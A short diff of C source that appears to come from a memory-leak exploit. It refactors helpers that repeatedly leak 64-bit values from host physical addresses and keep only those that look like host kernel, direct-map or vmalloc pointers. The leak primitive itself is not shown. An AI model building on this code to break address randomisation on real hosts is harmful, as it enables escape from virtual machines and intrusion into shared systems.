@@ -56,7 +56,12 @@ u64 leak64(hpa_t base, hpa_t pa)
 	}
 #endif
 
-        return val;
+	return val;
+}
+
+int is_kernel_ptr(va_t va, va_t dm)
+{
+	return (va >> 47) == 0x1ff;
 }
 
 int in_direct_map(va_t va, va_t dm)
@@ -71,7 +76,7 @@ int in_vmalloc(va_t va, va_t dm)
 	return vmalloc < va && va < vmalloc+(0x20ULL << 40);
 }
 
-hva_t host_leak_ptr(hpa_t base, hva_t hdm, hpa_t pa, int (*check)(va_t, va_t))
+hva_t leak_ptr(hpa_t base, hva_t dm, hpa_t pa, int (*check)(va_t, va_t))
 {
 	const int verbose = 1;
 	static int nr_tries_global = 0;
@@ -83,12 +88,12 @@ hva_t host_leak_ptr(hpa_t base, hva_t hdm, hpa_t pa, int (*check)(va_t, va_t))
 
 	for (int i = 0; i < 20; i++) {
 		hva_t ptr = leak64(base, pa);
-		if (check(ptr, hdm))
+		if (check(ptr, dm))
 			return ptr;
 		if (verbose)
-			printf("host_leak_ptr: retrying erronous ptr %lx\n", ptr);
+			printf("leak_ptr: retrying erronous ptr %lx\n", ptr);
 		if (++nr_tries_global >= 100)
-			err(1, "host_leak_ptr(base=%lx, hdm=%lx, pa=%lx): stuck! (%d)\n", base, hdm, pa, nr_tries_global);
+			err(1, "leak_ptr(base=%lx, dm=%lx, pa=%lx): stuck! (%d)\n", base, dm, pa, nr_tries_global);
 	}
 
 	return -1;
